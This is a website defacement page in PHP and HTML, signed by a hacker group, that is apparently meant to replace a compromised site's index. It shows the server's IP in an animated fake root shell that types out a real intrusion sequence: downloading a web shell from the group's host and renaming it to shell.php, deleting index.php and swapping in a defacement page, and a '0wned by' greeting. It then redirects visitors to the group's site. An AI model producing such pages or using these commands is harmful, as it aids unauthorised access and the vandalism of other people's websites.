<?php
//Server IP
$ip = $_SERVER['SERVER_ADDR'];
?>
<!------------------------------------
Source written by The Almighty Plum.
Feel free to edit but give credit.
Visit p0wersurge.com
#TeamPS
-------------------------------------!>
<title>In y0 b0x~</title>
<style type="text/css">
body {
background-image:url('https://i.imgur.com/41yF79l.png');
-webkit-background-size: cover;
-moz-background-size: cover;
-o-background-size: cover;
background-size: cover;
color:#FFFFFF;
overflow:hidden;
}
div.box
{
width:699px;
height:394px;
padding:10px;
border-width: thin;
border:1px solid black;
background-image:url('https://i.imgur.com/vRNTne7.png');
font-family: consolas;
font-size: 15;
outline-color:#FF0000;
}
#drag
{
width:699px;
height:394px;
}
a:link {color: #C0C0C0; text-decoration: none; }
a:active {color: #C0C0C0; text-decoration: none; }
a:visited {color: #C0C0C0; text-decoration: none; }
a:hover {color: #FFFFFF; text-decoration: none; }
</style>
<script type="text/javascript" src="./typingtext.js">
/****************************************************
* Typing Text script- By Twey @ Dynamic Drive Forums
****************************************************/
</script>
<center>
<div id="drag">
<img src="https://i.imgur.com/jWkfCUc.png"><br>
<div class="box" align="left">
root@<?php echo "$ip"; ?>:~$ <div id="who" style="display:none;">whoami</div><br>
<div id="whores" style="display:inline;"></div><br>
<div id="newline1" style="display:inline;"></div> <div id="shell" style="display:none;">wget http://p0wersurge.com/shell.txt</div><br>
<div id="newline2" style="display:inline;"></div> <div id="mv1" style="display:none;">mv shell.txt shell.php</div><br>
<div id="newline3" style="display:inline;"></div> <div id="deface" style="display:none;">wget http://p0wersurge.com/deface.txt</div><br>
<div id="newline4" style="display:inline;"></div> <div id="delindex" style="display:none;">rm index.php</div><br>
<div id="newline5" style="display:inline;"></div> <div id="mv2" style="display:none;">mv deface.txt index.php</div><br>
<div id="newline6" style="display:inline;"></div> <div id="greetz" style="display:none;">wget http://p0wersurge.com/greetings.txt</div><br>
<div id="newline7" style="display:inline;"></div> <div id="cat" style="display:none;">cat greetings.txt</div><br>
<div id="catresult" style="display:inline;"></div> 
<div id="newline8" style="display:inline;"></div> <div id="exit" style="display:none;">exit</div><br>
</div>
</div>
</center>
<script  type='text/javascript' src='http://ajax.microsoft.com/ajax/jquery/jquery-1.4.2.min.js'></script>
<script type='text/javascript' src='http://ajax.googleapis.com/ajax/libs/jqueryui/1.7.2/jquery-ui.min.js'></script>
<script type='text/javascript'>
   $(document).ready(function(){
		$('#drag').draggable();
    });
  </script>
<script type="text/javascript">
function redirect()
{
window.location = "http://p0wersurge.com/"
}
var whoami = new TypingText(document.getElementById("who"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, function whores (){document.getElementById("whores").innerHTML="root"; setTimeout(function(){document.getElementById("newline1").innerHTML="root@<?php echo "$ip"; ?>:~$";}, 300); setTimeout(function(){document.getElementById("shell").style.display="inline"; wgetshell.run();}, 1000);});
var wgetshell = new TypingText(document.getElementById("shell"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, function newline2 (){document.getElementById("newline2").innerHTML="root@<?php echo "$ip"; ?>:~$"; setTimeout(function(){document.getElementById("mv1").style.display="inline"; mv1.run();}, 500);});
var mv1 = new TypingText(document.getElementById("mv1"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, function newline3 (){document.getElementById("newline3").innerHTML="root@<?php echo "$ip"; ?>:~$"; setTimeout(function(){document.getElementById("deface").style.display="inline"; deface.run();}, 500);});
var deface = new TypingText(document.getElementById("deface"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, function newline4 (){document.getElementById("newline4").innerHTML="root@<?php echo "$ip"; ?>:~$"; setTimeout(function(){document.getElementById("delindex").style.display="inline"; delindex.run();}, 500);});
var delindex = new TypingText(document.getElementById("delindex"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, function newline5 (){document.getElementById("newline5").innerHTML="root@<?php echo "$ip"; ?>:~$"; setTimeout(function(){document.getElementById("mv2").style.display="inline"; mv2.run();}, 500);});
var mv2 = new TypingText(document.getElementById("mv2"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, function newline6 (){document.getElementById("newline6").innerHTML="root@<?php echo "$ip"; ?>:~$"; setTimeout(function(){document.getElementById("greetz").style.display="inline"; greetz.run();}, 500);});
var greetz = new TypingText(document.getElementById("greetz"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, function newline7 (){document.getElementById("newline7").innerHTML="root@<?php echo "$ip"; ?>:~$"; setTimeout(function(){document.getElementById("cat").style.display="inline"; cat.run();}, 500);});
var cat = new TypingText(document.getElementById("cat"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, function newline8 (){document.getElementById("catresult").innerHTML="-------------------------------<br>0wned by: Plum<br><br>Greetings: iJB, KrypTiK, ProxieZ,<br>BoxHead, Rele, Dante, and everyone<br>else at p0wersurge.com<br><br>Visit: <a href='http://p0wersurge.com'>p0wersurge.com</a><br><br>-------------------------------<br>"; document.getElementById("newline8").innerHTML="root@<?php echo "$ip"; ?>:~$"; setTimeout(function(){document.getElementById("exit").style.display="inline"; exit.run();}, 2500);});
var exit = new TypingText(document.getElementById("exit"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, function exit (){window.location = "http://p0wersurge.com/";});
setTimeout(function(){document.getElementById("who").style.display="inline"; whoami.run();}, 1000);
</script>
